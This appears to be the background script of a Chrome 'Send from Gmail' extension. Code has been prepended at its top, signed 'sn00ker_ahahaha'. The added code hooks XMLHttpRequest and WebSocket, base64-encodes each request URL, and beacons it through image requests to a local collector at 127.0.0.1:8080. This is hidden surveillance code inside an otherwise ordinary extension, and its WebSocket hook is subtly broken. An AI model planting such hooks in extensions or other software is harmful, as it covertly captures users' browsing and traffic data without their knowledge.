function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Copyright 2009 Google Inc. All Rights Reserved.

/**
 * @fileoverview Handles all message communication for the
 * for the background page for the Send from Gmail extension.
 */

var baseGmailUrl = "https://mail.google.com/";
var gmailUrlSuffix = "mail/?view=cm&fs=1&tf=1";

function makeGmailDomainUrl() {
  var gmailUrl = baseGmailUrl;
  var domainName = window.localStorage["domainName"];
  if (domainName) {
    gmailUrl += "a/" + domainName + "/";
  }
  return gmailUrl + gmailUrlSuffix;
}

var subjectPrefix = '';
var title = '';
var url = '';
// selected text from the current tab passed from content script.
var selectedText = '';

// Send message to the mailto script to update its cached gmail url.
// On any change in options, this message will be sent again.
chrome.extension.onConnect.addListener(
  function(port) {
    if (port.name == "GmailUrlConn") {
      port.onMessage.addListener(function(msg) {
      if (msg.req == "GmailUrlPlease") {
        port.postMessage({gmailDomainUrl: makeGmailDomainUrl()});
      } else {
        console.log("Unsupported req on valid port");
      }
    });
  }
});

chrome.extension.onRequest.addListener(
  function(connectionInfo) {
    selectedText = connectionInfo;
    makeGmailWin(selectedText);
});

// From = <whatever gmail account is logged in;
//         If not logged in, redirects to login page>
// To = <Unfilled>
//      [TODO: In the next version, may provide some Options for
//       favorite recipients]
// Subject = [Interesting Page] <Page's Title>
// Body = Summary Selection + URL
chrome.browserAction.onClicked.addListener(
  function(tab) {
    chrome.tabs.executeScript(null, {file: "infopasser.js"});
    title = tab.title;
    url = tab.url;
});

function makeGmailWin(summary) {
  // Ensure this is the active window
  var body = '';
  console.log("Summary = " + summary);
  var subject = "";
  if (localStorage["subjectPrefix"]) {
    subject += localStorage["subjectPrefix"] + " - ";
  }
  subject += title;
  if (summary == '') {
    body = url;
  } else {
    body = summary + "\n" + url;
  }
  var gmailURL = makeGmailDomainUrl() +
                 "&su=" + encodeURIComponent(subject) +
                 "&body=" + encodeURIComponent(body);
  chrome.windows.create({
    url: gmailURL,
    left: 20,
    top: 30,
    width: 700,
    height: 600
    });
}
